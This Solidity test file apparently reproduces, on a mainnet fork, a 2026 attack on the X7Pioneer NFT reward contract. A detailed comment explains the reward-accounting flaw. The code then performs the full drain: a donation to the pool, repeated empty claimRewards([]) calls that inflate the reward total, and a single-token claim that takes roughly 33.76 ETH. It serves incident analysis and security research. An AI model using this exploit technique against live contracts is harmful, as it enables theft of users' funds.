// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// X7 Finance (X7Pioneer NFT) - reward-accounting flaw in claimRewards() - Ethereum.
// ~6.78 ETH drained from the X7Pioneer reward pool on 2026-10-08.
//
// Attack tx     : 0xc98056d6ab55ef898189da5fa1fb08b968cb84ca99528d171f8240836b21766d (block 26146922)
// Attacker EOA  : 0xc79352119a7cf6efbfabbd7e6b013b79687bacf2
// Attack contract (on-chain): 0xaa0cad88ac3f76beb9a0f1ba661916d7716d5f4a
// X7Pioneer     : 0x70000299ee8910ccacd97b1bb560e34f49c9e4f7 (verified; vulnerable)
// Aave V3 Pool  : 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2 (WETH flash loan funds the donation)
// WETH          : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
//
// ROOT CAUSE (confirmed against verified source - X7Pioneer.claimRewards, lines 1407-1432):
//   function claimRewards(uint256[] memory tokenIds) public nonReentrant {
//       if (lastETHBalance < address(this).balance) {
//           totalRewards += (address(this).balance - lastETHBalance);   // runs on EVERY call
//       }
//       ... loop over tokenIds builds `claimable` ...
//       if (claimable > 0) {
//           lastETHBalance = address(this).balance - claimable;          // only updated when claimable > 0
//           (bool ok, ) = msg.sender.call{value: claimable}("");
//       }
//   }
//   The accumulator totalRewards is bumped by (balance - lastETHBalance) on every entry, but lastETHBalance
//   is only refreshed inside the `claimable > 0` branch. tokenIds is caller-supplied, so an empty array makes
//   the loop a no-op and leaves claimable == 0. The bump therefore runs while the refresh does not, so the
//   same unaccounted balance delta is re-counted into totalRewards on each empty call. Repeated empty calls
//   inflate totalRewards without bound; per-token reward is totalRewards / totalSupply(), so a single owned
//   NFT can then claim far more than its real share - up to the whole pool balance.
//
//   Three points verified on fork (see asserts below), not assumed:
//     1. the totalRewards bump is unconditional while the lastETHBalance refresh is gated by claimable > 0;
//     2. claimRewards accepts a caller-supplied array and an empty array reaches the bump with claimable == 0
//        (totalRewards strictly increases across empty calls while no ETH leaves the contract);
//     3. X7Pioneer source is verified on Etherscan, so the root cause is read directly from source.
//
// MECHANISM - fully permissionless. The attacker is a plain EOA that owns one X7Pioneer NFT (id 300). The
// donation is an ordinary ETH send into the contract's receive(), the inflating calls are public claimRewards([])
// calls, and the final drain is a public claimRewards([300]). No owner / admin / role / signature step is used.
// At the parent block address(this).balance == lastETHBalance (delta 0), so the donation is what creates the
// delta that the bug then double-counts; the attacker sourced that donation with an Aave WETH flash loan and
// repaid it in the same transaction, so the net profit is the pool's pre-existing genuine reward balance.
//
// RECONSTRUCTION - fork one block before the attack (26146921) and run the real sequence with typed calls to
// the real X7Pioneer. Nothing is replayed from the attacker's calldata/bytecode:
//   donate ETH to X7Pioneer -> repeat claimRewards([]) to inflate totalRewards -> claimRewards([300]) to drain
//   -> repay the borrowed capital. The NFT is moved from the EOA to the attack contract with a pranked transfer
//   (the EOA owns it on-chain and signed the real tx), then returned.
//   On-chain the donation capital (26.963170607692677032 WETH) was raised with an Aave V3 WETH flash loan and
//   repaid in the same tx. Here that capital is modeled with vm.deal (the repo's standard way of standing in for
//   flash-loan principal) and the principal is paid back out of the drained ETH, so the figure asserted as
//   profit is already net of the donation. A live Aave flashLoanSimple was tried first and reverted NotActivated
//   on the fork (the pool implementation code is not served at this block); the drain itself does not depend on
//   the loan, only on the donation being present, so the economics are unchanged.
//
// RESULT - the inflating loop lands totalRewards so that the single-token claim pays 33.756919822234785023 ETH,
// matching the on-chain RewardsClaimed amount to the wei. After repaying the 26.963170607692677032 borrowed
// principal, net profit is ~6.79 ETH. On-chain the attacker EOA balance rose by 6.777538... ETH; the small
// residual is the Aave premium (0.05%) and gas, neither of which this modeled run charges.
//
// Run: forge test --contracts src/test/2026-10/X7Finance_exp.sol -vvv

interface IX7Pioneer {
    function claimRewards(uint256[] memory tokenIds) external;
    function totalRewards() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function lastETHBalance() external view returns (uint256);
    function rewardsClaimed(uint256 tokenId) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract X7FinanceExploit is Test {
    IX7Pioneer internal constant X7P = IX7Pioneer(0x70000299Ee8910cCaCD97B1bB560E34F49c9e4f7);

    address internal constant ATTACKER_EOA = 0xC79352119A7cF6EFbFaBBD7e6b013B79687BaCf2;
    address internal constant LENDER = 0x000000000000000000000000000000000000dEaD; // stands in for the flash-loan pool
    uint256 internal constant TOKEN_ID = 300;
    uint256 internal constant LOAN = 26_963_170_607_692_677_032; // capital donated, borrowed via flash loan on-chain

    uint256 internal drained; // ETH paid out by the vulnerable final claim

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org", 26_146_921);
    }

    function testExploit() public {
        // The EOA owns the NFT on-chain; move it to this attack contract exactly as the real tx did.
        vm.prank(ATTACKER_EOA);
        X7P.transferFrom(ATTACKER_EOA, address(this), TOKEN_ID);

        // Point 1 + 3: confirm the source-level invariant on real fork state before touching anything.
        assertEq(X7P.ownerOf(TOKEN_ID), address(this), "attacker must own the NFT to drain");
        assertEq(
            address(X7P).balance,
            X7P.lastETHBalance(),
            "parent block: balance == lastETHBalance, so no natural delta - the donation creates it"
        );

        emit log_named_decimal_uint("X7Pioneer ETH balance (pre)", address(X7P).balance, 18);
        emit log_named_decimal_uint("totalRewards (pre)", X7P.totalRewards(), 18);
        emit log_named_uint("totalSupply", X7P.totalSupply());

        // Flash-loan principal (26.96 WETH on-chain), modeled as ETH. Donate it into the pool to create the
        // balance delta the bug double-counts.
        vm.deal(address(this), LOAN);
        (bool sent,) = address(X7P).call{value: LOAN}("");
        require(sent, "donation failed");

        _inflateAndDrain();

        // Hand the NFT back and repay the borrowed principal, as the real tx did. What remains is net profit.
        X7P.transferFrom(address(this), ATTACKER_EOA, TOKEN_ID);
        (bool repaid,) = LENDER.call{value: LOAN}("");
        require(repaid, "repay failed");

        emit log_named_decimal_uint("claimRewards([300]) paid out", drained, 18);
        emit log_named_decimal_uint("Attacker ETH profit (net of donation)", address(this).balance, 18);

        // Final claim reproduces the on-chain RewardsClaimed amount to the wei.
        assertEq(drained, 33_756_919_822_234_785_023, "drain must equal on-chain RewardsClaimed");
        // Net profit tracks the on-chain attacker EOA delta (~6.7775 ETH); modeled figure omits the Aave premium and gas.
        assertApproxEqAbs(address(this).balance, 6.78 ether, 0.02 ether, "net profit ~6.78 ETH");
    }

    function _inflateAndDrain() internal {
        uint256 supply = X7P.totalSupply();
        uint256 poolBalance = address(X7P).balance; // L + donation, constant during empty-array calls
        uint256 alreadyClaimed = X7P.rewardsClaimed(TOKEN_ID);
        uint256 delta = poolBalance - X7P.lastETHBalance(); // totalRewards is bumped by this on every entry

        // Point 2: repeatedly re-count the same delta via empty-array calls. The paying claim bumps
        // totalRewards once more on entry, so the drain uses (totalRewards + delta). Keep going only while
        // one further empty call would still leave that drain within the pool balance - otherwise
        // lastETHBalance = balance - claimable underflows inside the contract.
        uint256 before = X7P.totalRewards();
        uint256 calls;
        while (((X7P.totalRewards() + 2 * delta) / supply) - alreadyClaimed < poolBalance) {
            uint256[] memory none = new uint256[](0);
            X7P.claimRewards(none);
            calls++;
        }
        require(X7P.totalRewards() > before, "empty calls did not inflate totalRewards");
        emit log_named_uint("empty claimRewards([]) calls", calls);
        emit log_named_decimal_uint("totalRewards (inflated)", X7P.totalRewards(), 18);

        // Drain: a single owned token now claims almost the whole pool.
        uint256 balBefore = address(this).balance;
        uint256[] memory one = new uint256[](1);
        one[0] = TOKEN_ID;
        X7P.claimRewards(one);
        drained = address(this).balance - balBefore;
    }

    receive() external payable {}
}
